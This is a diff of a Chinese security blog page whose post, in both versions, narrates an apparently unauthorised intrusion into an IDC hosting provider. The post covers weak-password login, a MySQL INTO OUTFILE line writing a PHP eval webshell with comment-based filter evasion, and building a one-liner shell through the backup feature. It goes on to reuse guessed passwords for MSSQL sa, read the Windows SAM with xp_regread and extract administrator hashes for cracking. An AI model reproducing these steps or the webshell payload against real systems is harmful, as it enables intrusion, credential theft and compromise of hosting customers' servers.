@@ -1,151 +1,446 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>对IDC的一次检测 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>对IDC的一次检测 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="群里兄弟抛来一个站点，说要弄C段的另一个站点。看看，该IDC站点有数据备份后台，弱口令进入。       一、拿个shell    php站点，mysql数据库，可以sql备份、导入、导出、执行SQL，没有上传，root权限。    但是找不到站点的绝对路径，群里兄弟就找找周围的站点，希望能得到某个站点的绝对路径，    不久就爆出一个php的站点，准备mysql导出shell，但网站有注入检测系统，导入不成功，原因有：    （1）路径不对；    （2）root被降权，没有权限写；    （3）被检测到恶意代码；    前几天碰到过这种情况，改了  1. Select ‘&amp;lt;?php @eval($_POST[cmd])?&amp;gt;; ‘ into/**/outfile……../b.php’，OK  复制代码  连接成功。得到一个旁站的php shell。   测试了结果：    (1)执行命令不行；    (2)只能在本站转；    什么也干不了。    二、再拿php、asp&amp;#160; shell    后来有人把mysql的root密码破了，登陆phpmyadmin，直接进行数据库操作。用mysql客户端登陆没有登陆上。    上php大马，udf提权也失败了，原因不明。旁站的php shell权限很小，想到能利用的真不多。    又有人得到一个asp旁站的shell，上去看了，除了数据库组件、fso、mai组件外，其他都不能用，难怪不能执行cmd。    陆续又得到几个旁站的shell，都市php和asp的，能利用的少。">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="对IDC的一次检测 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="post-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/747.seo/" title="对IDC的一次检测" itemprop="url">对IDC的一次检测</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="http://ha.cker.in" title="Secer">Secer</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2012-08-09T18:13:46.000Z" itemprop="datePublished">2012-08-10</time>
+    Updated:<time datetime="2016-08-20T11:03:53.000Z" itemprop="dateModified">2016-08-20</time>
+    
+  </p>
 </header>
 
-      
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+		</div>
+		
+		<p>群里兄弟抛来一个站点，说要弄C段的另一个站点。看看，该IDC站点有数据备份后台，弱口令进入。   <br><a href="http://img.cker.in/IDC_8FAD/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/IDC_8FAD/clip_image002_thumb.jpg" width="620" height="452"></a>    <br>一、拿个shell    <br>php站点，mysql数据库，可以sql备份、导入、导出、执行SQL，没有上传，root权限。    <br>但是找不到站点的绝对路径，群里兄弟就找找周围的站点，希望能得到某个站点的绝对路径，    <br>不久就爆出一个php的站点，准备mysql导出shell，但网站有注入检测系统，导入不成功，原因有：    <br>（1）路径不对；    <br>（2）root被降权，没有权限写；    <br>（3）被检测到恶意代码；    <br>前几天碰到过这种情况，改了</p>  <p>1. Select ‘&lt;?php @eval($_POST[cmd])?&gt;; ‘ into/**/outfile……../b.php’，OK</p>  <p>复制代码</p>  <p>连接成功。得到一个旁站的php shell。   <br>测试了结果：    <br>(1)执行命令不行；    <br>(2)只能在本站转；    <br>什么也干不了。    <br>二、再拿php、asp&#160; shell    <br>后来有人把mysql的root密码破了，登陆phpmyadmin，直接进行数据库操作。用mysql客户端登陆没有登陆上。    <br>上php大马，udf提权也失败了，原因不明。旁站的php shell权限很小，想到能利用的真不多。    <br>又有人得到一个asp旁站的shell，上去看了，除了数据库组件、fso、mai组件外，其他都不能用，难怪不能执行cmd。    <br>陆续又得到几个旁站的shell，都市php和asp的，能利用的少。</p><a id="more"></a><p><a href="http://img.cker.in/IDC_8FAD/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/IDC_8FAD/clip_image004_thumb.jpg" width="620" height="442"></a>    <br><a href="http://img.cker.in/IDC_8FAD/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/IDC_8FAD/clip_image006_thumb.jpg" width="620" height="376"></a>    <br>可恶的管理员，TNND，php，asp都上了，难道还要上jsp的么？，o(∩_∩)o…，jsp不支持。    <br>三、拿主站shell    <br>综合分析所有的shell路径，来猜测网站的结构。    <br>(1)旁站是idc的客户站，php和asp的，系统iis6。    <br>(2)旁站的目录是D:\wwwroot\XXX站名XX\wwwroot\旁站内容    <br>(3)IDC的主站域名已知，<a href="http://forum.dis9.com/WWW.IDC%E5%9F%9F%E5%90%8D.cn" target="_blank" rel="external">WWW.IDC域名.cn</a>,但是不在D:\wwwroot\中&#160; asp站点    <br>(4)旁站有IDC的管理web端，包括主机、ftp和数据库管理， cp.IDC域名.cn&#160;&#160; asp站点    <br>(5)IDC的mysql数据备份域名,IDC域名.cn\upload&#160; php站点    <br>下一步思路：结合(3)(4)确定重点在IDC的管理端，如果能够拿到FTP管理密码或者主机管理密码，肯定权限大得多。    <br>mysql数据库得到了，现在已经拿到mysql的root权限，就在phpadmin里面找啊，翻啊，怎么也没有IDC管理的数据表和路径呢？ 所有的子站点都找到了，就是找不到主站点，难道用的mdb的。    <br>杯催啊。那只有是从主站入手了。    <br>看看（4）的登陆系统是hzhost的系统，看看能不能下个这样的系统，才发现是个专业的做IDC的，能管理mysql/mssql/ftp/DNS等等。存在本地管理程序，本地使用mssql数据库。分析在mysql找不到IDCweb管理端表原因：    <br>（1）asp使用的就是mdb数据    <br>（2）mssql在别的机器上    <br>管理端asp较简单，防护很严，难以入手。那现在只有想办法渗透数据域备份站，因为它与IDC管理同在一级域名下，距离近。    <br>数据备份站有sql，但是找不到绝对路径，猜了多个目录都无果。继续找，存在系统的sql数据备份，看图    <br><a href="http://img.cker.in/IDC_8FAD/clip_image008.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/IDC_8FAD/clip_image008_thumb.jpg" width="620" height="53"></a> ，    <br>应该是备份在本站目录下，再看能不能下载，有个压缩下载功能，看看备份的格式，php的，格式清楚了。    <br>接下来就是利用系统数据备份功能构造出php小马。phpadmin&#160; 建表，插入一句话，备份到文件，下载，发现是被引号包含。一般后台对备份都会有批量替换文本内容的功能，通过这个功能将一句话的外围去掉，通过替换、查看，注释其他的内容，包括包含的头文件，终于得到php一句话。    <br><a href="http://img.cker.in/IDC_8FAD/clip_image010.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010" border="0" alt="clip_image010" src="http://img.cker.in/IDC_8FAD/clip_image010_thumb.jpg" width="620" height="342"></a>    <br>四、拿sa    <br>从而得到IDC数据备份站的绝对目录，果然是与其他客户站不在一块。    <br>但时发现还是只能在本站转悠，列不了上级目录。注意到(3)(5),既然在同一级域名，而且都是iis管理的，与IDC管理    <br>站应该不远，记得下面还有一个phpadmin的后台，试一试phpadmin目录，可以列出phpadmin的目录。也就是说，不能列出父目录的内容，可以列出可以列出和自己同级别的目录的内容。试试IDC管理web端的域名目录，可惜不行。    <br>猜测IDC管理站的目录如果和数据管理目录重合的话，数据管理站只是IDC管理站的一部分的话，就可以得到IDC管理子目录的内容，果然，在IDC管理的主页的二级目录就可以在php的小马中列出，    <br><a href="http://img.cker.in/IDC_8FAD/clip_image012.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/IDC_8FAD/clip_image012_thumb.jpg" width="620" height="294"></a>    <br>首先看看数据库连接文件，发现有conns的上级目录，列出内容，找到const.asp，得到数据库连接字符串，是mssql的，    <br>我还以为asp都配mdb，何况已经开了mysql的情况下，难怪找不到<a href="http://ha.cker.in/tag/idc" target="_blank">IDC</a>管理站的数据表。    <br>验证数据库和web是不是在同一台机器上，幸好是。    <br>看看mssql的用户密码，不是sa的密码，不过密码与mysql root的密码很接近，多了一个数字，莫非管理员也偷懒。猜了几个admin的密码，最后发现sa的密码和连接字符串一样。得到sa密码，而且发现就是位置是local的。    <br>telnet <a href="http://ha.cker.in/tag/idc" target="_blank">idc</a> 的1433，开放，可以外连。    <br>拿出我的“杀人于无形，润物细无声”的利器，本地mssql客户端上之。    <br>五、拿hash    <br>xp_cmdshell 出错，但是存储过程是存在的，xp_regread可以，oacreate执行了，但没有效果，因为wsshell被删除了。    <br>上网找找，使用xp_regread 把管理员的sam值读出来，二进制很长。    <br>在自己机器上建一个用户，把值拷进去，使用注册表到hash方法，不能使用抓缓存的方法，抓取用户密码，得到了管理员的hash值，再拿去破解。    <br>可惜cmd5不给力，后台0%，hash丢给朋友了。    <br>到了12点，天冷了，冻得我膝盖痛。</p>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-<main class="content" role="main">
-  <article class="post">
-    <span class="post-meta">
-      <time datetime="2012-08-09T18:13:46.000Z" itemprop="datePublished">
-          2012-08-10
-      </time>
-    
-    
-    | 
-    <a href='/tag/入侵/'>入侵</a>,
-    
-    <a href='/tag/idc/'>idc</a>
-    
-    
-</span>
-    <h1 class="post-title">对IDC的一次检测</h1>
-    <section class="post-content">
-      <p>群里兄弟抛来一个站点，说要弄C段的另一个站点。看看，该IDC站点有数据备份后台，弱口令进入。   <br><a href="http://img.cker.in/IDC_8FAD/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/IDC_8FAD/clip_image002_thumb.jpg" width="620" height="452"></a>    <br>一、拿个shell    <br>php站点，mysql数据库，可以sql备份、导入、导出、执行SQL，没有上传，root权限。    <br>但是找不到站点的绝对路径，群里兄弟就找找周围的站点，希望能得到某个站点的绝对路径，    <br>不久就爆出一个php的站点，准备mysql导出shell，但网站有注入检测系统，导入不成功，原因有：    <br>（1）路径不对；    <br>（2）root被降权，没有权限写；    <br>（3）被检测到恶意代码；    <br>前几天碰到过这种情况，改了</p>  <p>1. Select ‘&lt;?php @eval($_POST[cmd])?&gt;; ‘ into/**/outfile……../b.php’，OK</p>  <p>复制代码</p>  <p>连接成功。得到一个旁站的php shell。   <br>测试了结果：    <br>(1)执行命令不行；    <br>(2)只能在本站转；    <br>什么也干不了。    <br>二、再拿php、asp&#160; shell    <br>后来有人把mysql的root密码破了，登陆phpmyadmin，直接进行数据库操作。用mysql客户端登陆没有登陆上。    <br>上php大马，udf提权也失败了，原因不明。旁站的php shell权限很小，想到能利用的真不多。    <br>又有人得到一个asp旁站的shell，上去看了，除了数据库组件、fso、mai组件外，其他都不能用，难怪不能执行cmd。    <br>陆续又得到几个旁站的shell，都市php和asp的，能利用的少。</p><a id="more"></a><p><a href="http://img.cker.in/IDC_8FAD/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/IDC_8FAD/clip_image004_thumb.jpg" width="620" height="442"></a>    <br><a href="http://img.cker.in/IDC_8FAD/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/IDC_8FAD/clip_image006_thumb.jpg" width="620" height="376"></a>    <br>可恶的管理员，TNND，php，asp都上了，难道还要上jsp的么？，o(∩_∩)o…，jsp不支持。    <br>三、拿主站shell    <br>综合分析所有的shell路径，来猜测网站的结构。    <br>(1)旁站是idc的客户站，php和asp的，系统iis6。    <br>(2)旁站的目录是D:\wwwroot\XXX站名XX\wwwroot\旁站内容    <br>(3)IDC的主站域名已知，<a href="http://forum.dis9.com/WWW.IDC%E5%9F%9F%E5%90%8D.cn" target="_blank" rel="external">WWW.IDC域名.cn</a>,但是不在D:\wwwroot\中&#160; asp站点    <br>(4)旁站有IDC的管理web端，包括主机、ftp和数据库管理， cp.IDC域名.cn&#160;&#160; asp站点    <br>(5)IDC的mysql数据备份域名,IDC域名.cn\upload&#160; php站点    <br>下一步思路：结合(3)(4)确定重点在IDC的管理端，如果能够拿到FTP管理密码或者主机管理密码，肯定权限大得多。    <br>mysql数据库得到了，现在已经拿到mysql的root权限，就在phpadmin里面找啊，翻啊，怎么也没有IDC管理的数据表和路径呢？ 所有的子站点都找到了，就是找不到主站点，难道用的mdb的。    <br>杯催啊。那只有是从主站入手了。    <br>看看（4）的登陆系统是hzhost的系统，看看能不能下个这样的系统，才发现是个专业的做IDC的，能管理mysql/mssql/ftp/DNS等等。存在本地管理程序，本地使用mssql数据库。分析在mysql找不到IDCweb管理端表原因：    <br>（1）asp使用的就是mdb数据    <br>（2）mssql在别的机器上    <br>管理端asp较简单，防护很严，难以入手。那现在只有想办法渗透数据域备份站，因为它与IDC管理同在一级域名下，距离近。    <br>数据备份站有sql，但是找不到绝对路径，猜了多个目录都无果。继续找，存在系统的sql数据备份，看图    <br><a href="http://img.cker.in/IDC_8FAD/clip_image008.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/IDC_8FAD/clip_image008_thumb.jpg" width="620" height="53"></a> ，    <br>应该是备份在本站目录下，再看能不能下载，有个压缩下载功能，看看备份的格式，php的，格式清楚了。    <br>接下来就是利用系统数据备份功能构造出php小马。phpadmin&#160; 建表，插入一句话，备份到文件，下载，发现是被引号包含。一般后台对备份都会有批量替换文本内容的功能，通过这个功能将一句话的外围去掉，通过替换、查看，注释其他的内容，包括包含的头文件，终于得到php一句话。    <br><a href="http://img.cker.in/IDC_8FAD/clip_image010.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010" border="0" alt="clip_image010" src="http://img.cker.in/IDC_8FAD/clip_image010_thumb.jpg" width="620" height="342"></a>    <br>四、拿sa    <br>从而得到IDC数据备份站的绝对目录，果然是与其他客户站不在一块。    <br>但时发现还是只能在本站转悠，列不了上级目录。注意到(3)(5),既然在同一级域名，而且都是iis管理的，与IDC管理    <br>站应该不远，记得下面还有一个phpadmin的后台，试一试phpadmin目录，可以列出phpadmin的目录。也就是说，不能列出父目录的内容，可以列出可以列出和自己同级别的目录的内容。试试IDC管理web端的域名目录，可惜不行。    <br>猜测IDC管理站的目录如果和数据管理目录重合的话，数据管理站只是IDC管理站的一部分的话，就可以得到IDC管理子目录的内容，果然，在IDC管理的主页的二级目录就可以在php的小马中列出，    <br><a href="http://img.cker.in/IDC_8FAD/clip_image012.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/IDC_8FAD/clip_image012_thumb.jpg" width="620" height="294"></a>    <br>首先看看数据库连接文件，发现有conns的上级目录，列出内容，找到const.asp，得到数据库连接字符串，是mssql的，    <br>我还以为asp都配mdb，何况已经开了mysql的情况下，难怪找不到<a href="http://ha.cker.in/tag/idc" target="_blank">IDC</a>管理站的数据表。    <br>验证数据库和web是不是在同一台机器上，幸好是。    <br>看看mssql的用户密码，不是sa的密码，不过密码与mysql root的密码很接近，多了一个数字，莫非管理员也偷懒。猜了几个admin的密码，最后发现sa的密码和连接字符串一样。得到sa密码，而且发现就是位置是local的。    <br>telnet <a href="http://ha.cker.in/tag/idc" target="_blank">idc</a> 的1433，开放，可以外连。    <br>拿出我的“杀人于无形，润物细无声”的利器，本地mssql客户端上之。    <br>五、拿hash    <br>xp_cmdshell 出错，但是存储过程是存在的，xp_regread可以，oacreate执行了，但没有效果，因为wsshell被删除了。    <br>上网找找，使用xp_regread 把管理员的sam值读出来，二进制很长。    <br>在自己机器上建一个用户，把值拷进去，使用注册表到hash方法，不能使用抓缓存的方法，抓取用户密码，得到了管理员的hash值，再拿去破解。    <br>可惜cmd5不给力，后台0%，hash丢给朋友了。    <br>到了12点，天冷了，冻得我膝盖痛。</p>
-    </section>
-    <footer class="post-footer">
-      <section class="author">
-    <h4>Secer</h4>
-    <p>记录互联网安全历程与个人成长经历</p>
-</section>
-      <section class="share">
-    <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/747.seo/" target="_blank">
-        <span class="hidden">weibo</span>
-    </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/747.seo/"
-       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-        <span class="hidden">Twitter</span>
-    </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/747.seo/"
-       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-        <span class="hidden">Facebook</span>
-    </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/747.seo/"
-       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-        <span class="hidden">Google+</span>
-    </a>
-</section>
-
-    </footer>
-  </article>
-  <nav class="pagination" role="pagination">
-    
-    <a class="newer-posts" href="/750.seo/">
-        ← 转国外 干掉一个wp站点
-    </a>
-    
-    <span class="icon-logo">•</span>
-    
-    <a class="older-posts" href="/742.seo/">
-        LinuxMint安装Lamp →
-    </a>
-    
-</nav>
-
-  <div id="comment" class="comments-area">
-    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
-    
-</div>
-
-</main>
-
-
-      
-<footer class="site-footer">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
-</footer>
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
-
-
-
-  </div>
 </div>
 
-<nav  class="outer-nav top horizontal">
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/category/渗透测试/">渗透测试</a>
+</div>
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+  <div class="article-tags">
+  
+  <span></span> <a href="/tag/入侵/">入侵</a><a href="/tag/idc/">idc</a>
+  </div>
 
-          <a class="icon-image"  href="/images"><span>Images</span></a>
 
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/750.seo/" title="转国外 干掉一个wp站点">
+  <strong>Prev:</strong><br/>
+  <span>
+  转国外 干掉一个wp站点</span>
+</a>
+</div>
 
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
 
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+<div class="next">
+<a href="/742.seo/"  title="LinuxMint安装Lamp">
+ <strong>Next:</strong><br/> 
+ <span>LinuxMint安装Lamp
+</span>
+</a>
+</div>
 
 </nav>
 
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-对IDC的一次检测" data-title="对IDC的一次检测" data-url="http://ha.cker.in/747.seo/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
 </div>
-</body>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
